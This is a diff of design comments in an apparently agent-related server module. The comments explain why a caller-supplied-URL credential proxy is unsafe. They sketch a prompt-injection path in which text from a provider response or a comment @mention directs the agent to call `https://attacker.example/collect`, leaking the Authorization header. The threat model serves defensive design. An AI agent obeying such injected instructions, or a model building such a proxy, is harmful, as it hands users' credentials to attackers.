@@ -3,8 +3,7 @@
 // ============================================================================
 // server/sandbox-skills.cjs — the Sandbox Agent's skill layer.
 // ----------------------------------------------------------------------------
-// PURE FUNCTIONS ONLY. No DB, no network, no express — same rule as
-// server/orbs.cjs, and for the same reason: everything that decides what a
+// PURE FUNCTIONS ONLY. No DB, no network, no express: everything that decides what a
 // provisioning agent is told, what a provider credential is called, and whether
 // a provider's response can become instructions must be provable in a unit test
 // with no Postgres and no live provider (tests/unit/sandboxSkills.test.ts).
@@ -140,8 +139,8 @@
 // THE THREAT THIS SHAPE EXISTS TO KILL. The obvious proxy — "the caller supplies
 // a URL and headers, the server attaches the credential and fetches" — is a
 // credential-exfiltration primitive, not a security feature. Anything that can
-// put text in the agent's context (an orb payload, a provider response, a
-// comment @mention — all real vectors in this repo) says *call
+// put text in the agent's context (a provider response, a comment @mention —
+// both real vectors in this repo) says *call
 // `https://attacker.example/collect`* and the server POSTs the Authorization
 // header to the attacker. There is no filter that fixes that, because the
 // caller naming the destination IS the bug.
